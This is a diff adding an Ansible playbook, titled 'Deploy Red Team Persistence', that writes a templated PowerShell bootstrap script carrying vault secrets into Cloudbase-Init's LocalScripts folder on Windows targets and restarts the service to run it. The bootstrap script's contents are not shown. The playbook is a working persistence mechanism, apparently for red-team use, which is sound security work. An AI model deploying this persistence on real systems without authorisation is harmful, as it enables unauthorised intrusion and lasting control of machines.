@@ -1,0 +1,22 @@
+# deploy.yml (full revised playbook)
+- name: Deploy Red Team Persistence
+  hosts: target_windows
+  vars_files:
+    - vault.yml
+
+  tasks:
+    - name: Template bootstrap script with secrets injected
+      win_template:
+        src: templates/bootstrap.ps1.j2
+        dest: "C:\\Windows\\Temp\\bootstrap.ps1"
+
+    - name: Move bootstrap to CloudBase-init LocalScripts
+      win_copy:
+        src: "C:\\Windows\\Temp\\bootstrap.ps1"
+        remote_src: yes
+        dest: "C:\\Program Files\\Cloudbase Solutions\\Cloudbase-Init\\LocalScripts\\bootstrap.ps1"
+
+    - name: Trigger CloudBase-init to run now without waiting for reboot
+      win_service:
+        name: cloudbase-init
+        state: restarted
